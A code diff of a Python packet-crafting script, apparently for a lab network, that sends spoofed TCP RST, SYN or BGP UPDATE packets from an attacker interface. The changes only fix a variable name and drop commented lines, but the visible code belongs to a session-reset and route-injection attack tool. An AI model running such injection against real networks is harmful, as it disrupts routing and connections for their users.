@@ -48,8 +48,6 @@ def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 	tcp = TCP(flags="S")
 	tcp.sport=int(srcPort)
 	tcp.dport=int(dstPort)
-	#tcp.sport=179
-	#tcp.dport=randint(1025,65535)
 	tcp.seq=0
 	tcp.ack=0
 	tcp.window=int(win)
@@ -196,9 +194,9 @@ def retrieve_ports_and_numbers(iface, srcIP, dstIP):
 
 
 def main():
-	choise = int(sys.argv[1])
-	assert choise >= 1
-	assert choise <= 3
+	choice = int(sys.argv[1])
+	assert choice >= 1
+	assert choice <= 3
 
 	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
 	#src_mac_address = retrieve_atk1_mac_address('atk1-eth1')
@@ -226,9 +224,9 @@ def main():
 
 	iface = 'atk1-eth0'
 
-	if choise == 1:
+	if choice == 1:
 		send_rst_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
-	elif choise == 2:
+	elif choice == 2:
 		send_syn_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 	else:
 		send_update_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
